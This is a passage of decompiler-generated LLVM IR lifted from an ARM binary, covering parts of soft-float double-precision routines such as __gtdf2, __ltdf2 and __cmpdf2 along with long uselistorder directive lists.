  %v9_1e328 = and i32 %v6_1e328, %v8_1e328
  %v11_1e328 = icmp slt i32 %v2_1e1d8, -1023
  %v12_1e328 = icmp eq i32 %v6_1e328, 0
  %v7_1e32c = icmp sgt i32 %v2_1e1d8, -1023
  br i1 %v7_1e32c, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1e320
  %v10_1e32c = sub nsw i32 1024, %v2_1e1d8
  store i32 %v10_1e32c, i32* %r5.global-to-local, align 4
  %v14_1e32c = and i32 %v10_1e32c, %v6_1e328
  %v16_1e32c = icmp slt i32 %v10_1e32c, 0
  %v17_1e32c = icmp eq i32 %v6_1e328, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1e320, %bb106
  %v3_1e338.in = phi i32 [ %v9_1e328, %dec_label_pc_1e320 ], [ %v14_1e32c, %bb106 ]
  %v2_1e338 = phi i1 [ %v11_1e328, %dec_label_pc_1e320 ], [ %v16_1e32c, %bb106 ]
  %v1_1e338 = phi i1 [ %v12_1e328, %dec_label_pc_1e320 ], [ %v17_1e32c, %bb106 ]
  %v3_1e338 = icmp slt i32 %v3_1e338.in, 0
  %v3_1e330 = xor i1 %v3_1e338, %v2_1e338
  %v4_1e330 = or i1 %v1_1e338, %v3_1e330
  br i1 %v4_1e330, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1e33084 = mul i32 %v6_1e328, 1048576
  %v10_1e33085 = or i32 %v9_1e33084, %v5_1e324
  store i32 %v10_1e33085, i32* %r1.global-to-local, align 4
  store i32 %v3_1e1b8, i32* %r4.global-to-local, align 4
  store i32 %v6_1e1b8, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1e338 = phi i32 [ %v12_1e1b8, %bb108 ], [ %v1_1e320, %bb107 ]
  %v6_1e338 = xor i1 %v4_1e330, true
  call void @__pseudo_cond_branch(i1 %v6_1e338, i32 %v0_1e338)
  %v0_1e33c = load i32, i32* %r1.global-to-local, align 4
  %v1_1e33c = or i32 %v0_1e33c, 1048576
  store i32 %v1_1e33c, i32* @r1, align 4
  %v0_1e344 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e344 = add i32 %v0_1e344, -1
  store i32 %v1_1e344, i32* @r4, align 4
  %v3_1e344 = sub i32 0, %v0_1e344
  %v4_1e344 = and i32 %v0_1e344, %v3_1e344
  %v5_1e344 = icmp slt i32 %v4_1e344, 0
  store i1 %v5_1e344, i1* @cpsr_v, align 1
  %v6_1e344 = icmp slt i32 %v1_1e344, 0
  store i1 %v6_1e344, i1* @cpsr_n, align 1
  %v7_1e344 = icmp eq i32 %v0_1e344, 1
  store i1 %v7_1e344, i1* @cpsr_z, align 1
  %v0_1e348 = call i32 @function_1e014()
  store i32 %v0_1e348, i32* @r0, align 4
  %v0_1e350 = call i32 @function_1e014()
  store i32 %v0_1e350, i32* @r0, align 4
  %v0_1e354.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1e358.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1e354

dec_label_pc_1e354:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1e354.pre-phi = phi i32 [ %v5_1e1c8, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1e1c8, %bb91 ], [ %v5_1e1c8, %.thread ]
  %v0_1e358 = phi i32 [ %v5_1e1c4, %.thread1 ], [ %v5_1e1c4, %.thread2 ], [ %v5_1e1c4, %bb91 ], [ %v0_1e358.pre, %.thread ]
  %v2_1e35c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1e354.pre, %.thread ]
  %v5_1e354 = and i32 %v2_1e35c, %v4_1e354.pre-phi
  store i32 %v5_1e354, i32* @r5, align 4
  %v4_1e358 = icmp eq i32 %v2_1e35c, %v0_1e358
  br i1 %v4_1e358, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1e354
  %v5_1e35c = icmp eq i32 %v5_1e354, %v2_1e35c
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1e354, %bb109
  %v0_1e360 = phi i1 [ false, %dec_label_pc_1e354 ], [ %v5_1e35c, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1e360, i32 ptrtoint (i32* @global_var_1e1a8.1243 to i32))
  %v0_1e364 = load i32, i32* @r4, align 4
  %v1_1e364 = load i32, i32* %ip.global-to-local, align 4
  %v4_1e364 = icmp eq i32 %v1_1e364, %v0_1e364
  br i1 %v4_1e364, label %dec_label_pc_1e36c, label %dec_label_pc_1e388

dec_label_pc_1e36c:                               ; preds = %bb110
  %v0_1e36c = load i32, i32* @r0, align 4
  %v1_1e36c = load i32, i32* @r1, align 4
  %v4_1e36c = mul i32 %v1_1e36c, 4096
  %v5_1e36c = or i32 %v4_1e36c, %v0_1e36c
  store i32 %v5_1e36c, i32* %r4.global-to-local, align 4
  %v1_1e370 = icmp ne i32 %v5_1e36c, 0
  call void @__pseudo_cond_branch(i1 %v1_1e370, i32 ptrtoint (i32* @global_var_1e1a8.1243 to i32))
  %v0_1e374 = load i32, i32* @r5, align 4
  %v1_1e374 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e378 = icmp ne i32 %v1_1e374, %v0_1e374
  call void @__pseudo_cond_branch(i1 %v1_1e378, i32 ptrtoint (i32* @global_var_1e18c.1244 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1e384 = call i32 @function_1e1a8(i32 %arg3, i32 %arg4)
  store i32 %v2_1e384, i32* @r0, align 4
  %v1_1e388.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1e388

dec_label_pc_1e388:                               ; preds = %bb110, %dec_label_pc_1e36c
  %v1_1e388 = phi i32 [ %v1_1e364, %bb110 ], [ %v1_1e388.pre, %dec_label_pc_1e36c ]
  %v0_1e388 = load i32, i32* @r5, align 4
  %v4_1e388 = icmp eq i32 %v0_1e388, %v1_1e388
  br i1 %v4_1e388, label %dec_label_pc_1e390, label %dec_label_pc_1e388.dec_label_pc_1e3a4_crit_edge

dec_label_pc_1e388.dec_label_pc_1e3a4_crit_edge:  ; preds = %dec_label_pc_1e388
  %v0_1e3a4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1e3a4

dec_label_pc_1e390:                               ; preds = %dec_label_pc_1e388
  %v4_1e390 = mul i32 %arg4, 4096
  %v5_1e390 = or i32 %v4_1e390, %arg3
  store i32 %v5_1e390, i32* %r5.global-to-local, align 4
  %v7_1e390 = icmp eq i32 %v5_1e390, 0
  call void @__pseudo_cond_branch(i1 %v7_1e390, i32 ptrtoint (i32* @global_var_1e13c.1245 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1e3a0 = call i32 @function_1e1a8(i32 %arg3, i32 %arg4)
  store i32 %v2_1e3a0, i32* @r0, align 4
  br label %dec_label_pc_1e3a4

dec_label_pc_1e3a4:                               ; preds = %dec_label_pc_1e388.dec_label_pc_1e3a4_crit_edge, %dec_label_pc_1e390
  %v0_1e3a4 = phi i32 [ %v0_1e3a4.pre, %dec_label_pc_1e388.dec_label_pc_1e3a4_crit_edge ], [ %v2_1e3a0, %dec_label_pc_1e390 ]
  %v1_1e3a4 = load i32, i32* @r1, align 4
  %v3_1e3a4 = mul i32 %v1_1e3a4, 2
  %v4_1e3a4 = or i32 %v3_1e3a4, %v0_1e3a4
  store i32 %v4_1e3a4, i32* %r6.global-to-local, align 4
  %v6_1e3a4 = icmp eq i32 %v4_1e3a4, 0
  br i1 %v6_1e3a4, label %dec_label_pc_1e3a4._crit_edge, label %bb111

dec_label_pc_1e3a4._crit_edge:                    ; preds = %dec_label_pc_1e3a4
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1e3a4
  %v4_1e3a8 = mul i32 %arg4, 2
  %v5_1e3a8 = or i32 %v4_1e3a8, %arg3
  store i32 %v5_1e3a8, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1e3a8, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1e3a4._crit_edge, %bb111
  %v4_1e3b8.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1e3a4._crit_edge ], [ %v5_1e3a8, %bb111 ]
  %v0_1e3ac = phi i1 [ false, %dec_label_pc_1e3a4._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1e3ac, i32 ptrtoint (i32* @global_var_1e0d4.1246 to i32))
  %v0_1e3b0 = load i32, i32* @r0, align 4
  %v1_1e3b0 = load i32, i32* @r1, align 4
  %v3_1e3b0 = mul i32 %v1_1e3b0, 2
  %v4_1e3b0 = or i32 %v3_1e3b0, %v0_1e3b0
  store i32 %v4_1e3b0, i32* %r4.global-to-local, align 4
  %v1_1e3b4 = icmp ne i32 %v4_1e3b0, 0
  call void @__pseudo_cond_branch(i1 %v1_1e3b4, i32 ptrtoint (i32* @global_var_1e18c.1244 to i32))
  store i32 %v4_1e3b8.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1e3bc = icmp ne i32 %v4_1e3b8.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1e3bc, i32 ptrtoint (i32* @global_var_1e13c.1245 to i32))
  %v0_1e3c0 = load i32, i32* @r0, align 4
  %v1_1e3c0 = load i32, i32* @r1, align 4
  %v2_1e3c0 = call i32 @function_1e1a8(i32 %v0_1e3c0, i32 %v1_1e3c0)
  store i32 %v2_1e3c0, i32* %r0.global-to-local, align 4
  ret i32 %v2_1e3c0

; uselistorder directives
  uselistorder i32 %v5_1e3a8, { 1, 0, 2 }
  uselistorder i32 %v1_1e364, { 1, 0 }
  uselistorder i32 %v1_1e344, { 1, 0 }
  uselistorder i32 %v0_1e344, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1e32c, { 2, 0, 1 }
  uselistorder i32 %v6_1e328, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1e320, { 1, 0 }
  uselistorder i32 %v2_1e308, { 1, 0, 2 }
  uselistorder i32 %v1_1e308, { 1, 0, 2 }
  uselistorder i32 %v1_1e304, { 1, 0, 2 }
  uselistorder i32 %v0_1e304, { 1, 0, 2 }
  uselistorder i1 %v7_1e2f8, { 1, 0 }
  uselistorder i32 %v2_1e2dc, { 1, 0 }
  uselistorder i32 %v3_1e2c8, { 2, 1, 0 }
  uselistorder i32 %v3_1e2bc, { 0, 2, 1 }
  uselistorder i32 %v5_1e2b8, { 2, 0, 1 }
  uselistorder i32 %v6_1e2a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1e294, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1e290, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1e29c, { 0, 2, 1 }
  uselistorder i32 %v1_1e2a8, { 1, 0 }
  uselistorder i32 %v6_1e28c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1e278, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1e274, { 0, 2, 1 }
  uselistorder i32 %v0_1e280, { 0, 2, 1 }
  uselistorder i32 %v1_1e28c, { 1, 0 }
  uselistorder i32 %v6_1e270, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1e25c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1e264, { 0, 2, 1 }
  uselistorder i32 %v1_1e270, { 1, 0 }
  uselistorder i32 %v3_1e254, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1e248, { 1, 2, 0 }
  uselistorder i32 %v3_1e2c813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1e2c417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1e248, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1e254, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1e2f0.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1e234, { 1, 0 }
  uselistorder i32 %v0_1e238, { 1, 0 }
  uselistorder i32 %v3_1e224, { 1, 0 }
  uselistorder i1 %v1_1e218, { 1, 0 }
  uselistorder i32 %v3_1e208, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1e204, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1e1fc, { 2, 1, 0 }
  uselistorder i32 %v5_1e1f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1e1d8, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1e1c8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1e1c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1e1c4, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1e1c4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1e1b8, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 8, 9, 10, 11, 12, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 6, 5, 7, 8, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 6, 7, 9, 8, 10, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 9, 3, 6, 7, 4, 5, 0, 1, 2, 8 }
  uselistorder i32* %ip.global-to-local, { 1, 3, 4, 2, 6, 7, 8, 9, 10, 0, 5 }
  uselistorder i32 (i32, i32)* @function_1e1a8, { 2, 1, 0 }
  uselistorder i32 ()* @function_1e014, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 8, 9, 3, 10, 1, 11, 12, 13, 5, 6, 7, 4 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 26, 12, 13, 2, 14, 15, 30, 133, 134, 141, 143, 16, 144, 17, 147, 148, 43, 149, 151, 168, 169, 170, 32, 31, 44, 171, 18, 172, 173, 156, 157, 110, 111, 45, 94, 95, 96, 97, 145, 146, 90, 91, 92, 93, 142, 3, 46, 174, 175, 176, 177, 37, 38, 39, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 158, 162, 163, 135, 47, 136, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 159, 40, 123, 137, 138, 48, 49, 139, 140, 98, 99, 50, 100, 51, 52, 53, 33, 150, 41, 101, 180, 102, 54, 55, 56, 57, 58, 60, 61, 152, 153, 154, 155, 62, 183, 184, 0, 185, 186, 59, 63, 166, 28, 164, 165, 5, 4, 34, 64, 65, 66, 67, 68, 69, 124, 125, 126, 127, 128, 129, 86, 160, 161, 103, 70, 71, 167, 19, 72, 73, 20, 27, 21, 22, 6, 23, 24, 35, 74, 75, 104, 105, 106, 107, 108, 109, 76, 77, 130, 78, 42, 79, 131, 80, 87, 88, 81, 89, 132, 29, 36, 82, 178, 179, 181, 83, 182, 25, 84, 85 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 64, 65, 33, 6, 7, 22, 8, 135, 136, 143, 145, 146, 147, 148, 9, 149, 151, 152, 153, 154, 155, 34, 74, 50, 51, 66, 164, 165, 166, 167, 29, 95, 75, 76, 77, 78, 150, 144, 182, 183, 189, 238, 42, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 168, 96, 97, 98, 99, 100, 101, 102, 103, 104, 10, 43, 105, 40, 106, 107, 67, 108, 109, 169, 170, 171, 137, 138, 139, 140, 141, 142, 79, 80, 81, 82, 52, 256, 257, 35, 83, 11, 133, 185, 84, 85, 31, 190, 191, 192, 193, 194, 195, 196, 197, 12, 56, 198, 199, 200, 201, 202, 203, 204, 205, 13, 156, 157, 158, 159, 160, 161, 162, 163, 206, 207, 208, 209, 14, 210, 211, 15, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 229, 222, 223, 224, 225, 57, 24, 226, 227, 228, 58, 59, 16, 230, 231, 232, 233, 235, 236, 60, 17, 237, 18, 234, 177, 46, 47, 44, 45, 25, 26, 37, 38, 48, 258, 176, 172, 173, 110, 111, 68, 112, 113, 114, 115, 30, 116, 61, 62, 117, 118, 119, 49, 120, 121, 122, 123, 27, 28, 124, 125, 126, 63, 174, 175, 86, 178, 32, 179, 180, 181, 53, 69, 36, 19, 20, 23, 21, 87, 88, 89, 90, 91, 92, 93, 54, 94, 127, 128, 55, 129, 130, 131, 132, 70, 71, 72, 73, 41, 39, 134, 184, 186, 187, 188 }
  uselistorder i32 4, { 5, 6, 190, 267, 268, 191, 7, 8, 272, 273, 274, 275, 276, 69, 277, 278, 286, 288, 289, 103, 290, 291, 292, 83, 293, 296, 129, 297, 298, 299, 300, 301, 302, 9, 303, 130, 104, 304, 131, 0, 1, 132, 307, 329, 330, 106, 105, 331, 133, 134, 135, 136, 332, 333, 108, 334, 107, 335, 85, 226, 227, 228, 320, 321, 204, 205, 294, 295, 199, 200, 201, 202, 203, 287, 10, 336, 11, 337, 345, 279, 12, 13, 14, 263, 15, 16, 229, 17, 102, 97, 98, 18, 404, 99, 405, 88, 19, 20, 100, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 21, 423, 424, 425, 426, 427, 428, 87, 429, 430, 431, 432, 433, 434, 22, 23, 101, 435, 323, 109, 230, 231, 232, 233, 234, 235, 236, 237, 238, 84, 239, 240, 241, 242, 243, 322, 244, 137, 280, 281, 282, 283, 284, 285, 24, 206, 207, 208, 209, 25, 210, 436, 138, 110, 139, 437, 26, 438, 140, 197, 198, 348, 349, 350, 92, 351, 141, 27, 211, 142, 212, 143, 89, 213, 269, 144, 270, 271, 339, 340, 341, 342, 145, 146, 214, 147, 148, 215, 28, 216, 217, 86, 90, 354, 355, 356, 357, 358, 359, 149, 150, 29, 360, 361, 362, 363, 364, 365, 366, 367, 151, 352, 353, 308, 309, 310, 311, 312, 313, 314, 315, 316, 30, 317, 318, 319, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 152, 153, 154, 382, 383, 386, 389, 384, 385, 111, 155, 387, 70, 388, 390, 391, 392, 394, 156, 32, 31, 393, 157, 158, 159, 346, 324, 403, 33, 34, 35, 36, 2, 245, 37, 38, 160, 71, 39, 40, 218, 161, 41, 162, 163, 164, 165, 246, 247, 42, 248, 166, 249, 250, 251, 113, 252, 253, 112, 167, 254, 255, 256, 257, 258, 259, 72, 168, 260, 262, 169, 170, 261, 192, 325, 43, 326, 114, 327, 328, 305, 306, 395, 396, 193, 44, 45, 46, 47, 73, 48, 49, 50, 74, 51, 52, 171, 53, 219, 115, 220, 116, 221, 222, 223, 224, 225, 75, 76, 172, 264, 93, 265, 94, 266, 54, 95, 96, 55, 77, 118, 194, 173, 174, 175, 176, 122, 177, 178, 120, 117, 195, 121, 56, 179, 119, 57, 196, 128, 58, 59, 91, 180, 123, 338, 343, 181, 78, 79, 60, 61, 62, 125, 124, 126, 80, 182, 127, 63, 64, 81, 183, 344, 184, 82, 185, 186, 65, 347, 66, 67, 68, 397, 398, 399, 400, 401, 402, 187, 188, 189, 3, 4 }
  uselistorder i32 32, { 92, 93, 94, 95, 30, 31, 39, 82, 83, 33, 34, 96, 32, 40, 97, 98, 99, 100, 37, 101, 117, 119, 120, 131, 47, 84, 132, 121, 122, 85, 86, 87, 88, 118, 134, 41, 35, 102, 48, 22, 103, 104, 49, 123, 124, 43, 42, 51, 55, 52, 56, 53, 57, 54, 58, 59, 125, 126, 60, 68, 69, 67, 70, 71, 72, 73, 74, 75, 62, 63, 1, 64, 2, 65, 4, 3, 61, 66, 50, 76, 135, 6, 5, 8, 7, 10, 9, 36, 129, 127, 128, 105, 106, 21, 107, 0, 77, 108, 109, 110, 111, 112, 113, 23, 89, 90, 130, 136, 78, 91, 79, 38, 114, 115, 116, 12, 11, 24, 44, 80, 133, 25, 14, 13, 16, 15, 26, 18, 17, 27, 28, 20, 19, 29, 45, 46, 81 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 9, 0, 2, 1, 10 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 85, 13, 14, 15, 84, 96, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 89, 56, 90, 57, 91, 58, 92, 93, 59, 60, 62, 61, 63, 64, 65, 66, 0, 87, 1, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 83, 94, 77, 82, 88, 95, 81, 78, 86, 79, 80 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 72, 73, 74, 75, 126, 127, 4, 128, 129, 130, 131, 147, 148, 149, 150, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 189, 190, 191, 192, 193, 194, 195, 207, 208, 209, 221, 222, 223, 224, 6, 5, 31, 32, 33, 34, 35, 36, 225, 226, 7, 227, 228, 229, 230, 231, 232, 233, 151, 152, 153, 154, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 132, 8, 133, 134, 76, 77, 78, 79, 9, 80, 81, 82, 83, 84, 85, 86, 135, 136, 137, 138, 10, 11, 139, 140, 141, 142, 143, 144, 145, 146, 37, 38, 39, 40, 41, 42, 43, 44, 12, 13, 14, 292, 293, 294, 295, 296, 297, 2, 298, 299, 26, 15, 27, 16, 28, 288, 289, 290, 291, 45, 46, 47, 122, 123, 124, 125, 48, 49, 50, 51, 52, 53, 256, 260, 261, 262, 263, 257, 258, 259, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 264, 265, 266, 267, 268, 17, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 284, 286, 280, 281, 282, 283, 285, 287, 119, 120, 3, 121, 25, 251, 252, 253, 254, 255, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 18, 210, 211, 56, 19, 57, 58, 212, 20, 213, 214, 98, 21, 24, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 1, 114, 22, 29, 99, 0, 100, 101, 54, 55, 215, 216, 23, 217, 218, 219, 220, 115, 116, 117, 118, 180, 181, 182, 183, 184, 185, 186, 187, 188, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 248, 249, 250, 30 }
  uselistorder i32* @r5, { 123, 124, 125, 126, 127, 128, 129, 130, 131, 54, 55, 56, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 248, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 1, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 8, 289, 290, 291, 292, 293, 346, 301, 302, 303, 304, 305, 306, 307, 28, 308, 309, 310, 327, 363, 364, 9, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 10, 380, 379, 30, 381, 382, 383, 384, 385, 57, 58, 59, 60, 61, 62, 63, 386, 387, 388, 389, 390, 391, 396, 397, 392, 393, 394, 395, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 11, 154, 155, 64, 65, 66, 67, 68, 69, 70, 71, 72, 249, 250, 251, 252, 253, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 347, 348, 349, 350, 452, 453, 454, 226, 33, 227, 5, 228, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 328, 329, 31, 330, 229, 230, 231, 232, 156, 2, 157, 158, 159, 160, 161, 162, 233, 14, 234, 235, 12, 236, 237, 238, 239, 240, 241, 13, 242, 243, 244, 245, 246, 247, 73, 15, 74, 75, 76, 77, 34, 78, 16, 79, 80, 81, 82, 83, 467, 17, 468, 469, 479, 43, 44, 45, 46, 47, 48, 49, 470, 471, 472, 473, 474, 84, 85, 86, 87, 88, 89, 90, 91, 92, 212, 213, 214, 93, 94, 95, 96, 18, 19, 475, 476, 477, 478, 97, 98, 99, 100, 420, 421, 425, 426, 427, 428, 429, 422, 423, 424, 311, 312, 313, 20, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 7, 443, 444, 445, 446, 447, 21, 448, 449, 450, 451, 207, 208, 209, 210, 211, 410, 411, 412, 413, 36, 417, 418, 22, 419, 351, 23, 352, 353, 354, 163, 24, 164, 35, 165, 166, 167, 168, 169, 170, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 105, 106, 107, 108, 109, 341, 342, 343, 344, 345, 171, 172, 174, 173, 175, 176, 25, 177, 178, 179, 180, 181, 182, 183, 32, 184, 185, 189, 6, 190, 3, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 50, 51, 52, 186, 187, 188, 102, 101, 29, 103, 104, 355, 356, 357, 358, 359, 360, 26, 361, 362, 201, 202, 203, 204, 205, 206, 294, 295, 296, 297, 298, 27, 299, 300, 110, 111, 4, 0, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 37, 38, 39, 40, 41, 42, 414, 415, 416, 53 }
  uselistorder i32 %arg4, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1e3a4, { 1, 0 }
  uselistorder label %dec_label_pc_1e388, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1e354, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1e244, { 1, 0 }
  uselistorder label %dec_label_pc_1e22c, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1e3c8 = call i32 @function_1e3d8()
  ret i32 %v0_1e3c8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1e3d0 = call i32 @function_1e3d8()
  ret i32 %v0_1e3d0

; uselistorder directives
  uselistorder i32 ()* @function_1e3d8, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1e3d4 = load i32, i32* @r0, align 4
  ret i32 %v0_1e3d4
}

define i32 @function_1e3d8() local_unnamed_addr {
dec_label_pc_1e3d8:
  %v0_1e3d8 = load i32, i32* @ip, align 4
  %v0_1e3dc = load i32, i32* @r1, align 4
  %v2_1e3dc = mul i32 %v0_1e3dc, 2
  %v2_1e3dc.off = add i32 %v2_1e3dc, 4194303
  %tmp = icmp ult i32 %v2_1e3dc.off, 2097152
  %v0_1e3e4 = load i32, i32* @r3, align 4
  %v2_1e3e4 = mul i32 %v0_1e3e4, 2
  br i1 %tmp, label %dec_label_pc_1e434, label %bb

bb:                                               ; preds = %dec_label_pc_1e3d8
  %v2_1e3e4.off = add i32 %v2_1e3e4, 4194303
  %tmp21 = icmp ult i32 %v2_1e3e4.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1e428, label %dec_label_pc_1e3f0

dec_label_pc_1e3f0:                               ; preds = %dec_label_pc_1e43c, %dec_label_pc_1e448, %bb
  %v0_1e3f0 = load i32, i32* @r0, align 4
  %v4_1e3f0 = or i32 %v0_1e3f0, %v2_1e3dc
  %v6_1e3f0 = icmp eq i32 %v4_1e3f0, 0
  br i1 %v6_1e3f0, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1e3f0
  %v1_1e3f4 = load i32, i32* @r2, align 4
  %v5_1e3f4 = or i32 %v1_1e3f4, %v2_1e3e4
  %v7_1e3f4 = icmp eq i32 %v5_1e3f4, 0
  br i1 %v7_1e3f4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1e3f0, %bb10
  %v5_1e3f8 = icmp eq i32 %v0_1e3e4, %v0_1e3dc
